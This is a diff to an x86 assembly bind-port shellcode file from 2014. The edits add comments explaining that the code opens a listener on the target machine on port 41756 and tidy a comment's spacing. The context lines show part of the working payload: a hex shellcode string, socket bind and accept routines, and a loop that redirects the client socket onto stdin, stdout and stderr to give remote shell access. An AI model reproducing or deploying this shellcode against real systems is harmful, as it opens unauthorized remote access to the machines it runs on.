@@ -2,7 +2,11 @@
 ; 24 October 2014
 ; Bind Port Shellcode
 ;
+; This Shellcode will create a listener on the target machine based
+; on the port below
+;
 ; nasm -f bin bindport-shellcode.asm
+
 %comment 
 my $shellcode =
 "\x31\xdb\x53\x6a\x01\x6a\x02\x89\xe1\x43\xb8\x66\x00\x00\x00" . 
@@ -40,7 +44,7 @@ bind_socket:
     ; setup sockaddr
     pop     esi
     push    edx
-    push    word 0xa31c
+    push    word 0xa31c  ;port 41756
     push    bx
     mov     ecx, esp
     ; setup bind arguments
@@ -68,7 +72,7 @@ accept_incoming:
 dup_incoming:
     mov     ebx,eax      ;ebx=client_sock
     xor     ecx,ecx
-    mov     cl, 3           ;dup stderr, stdout, stdin
+    mov     cl, 3        ;dup stderr, stdout, stdin
 dup_loop:
     mov     al, 0x3f
     dec     ecx
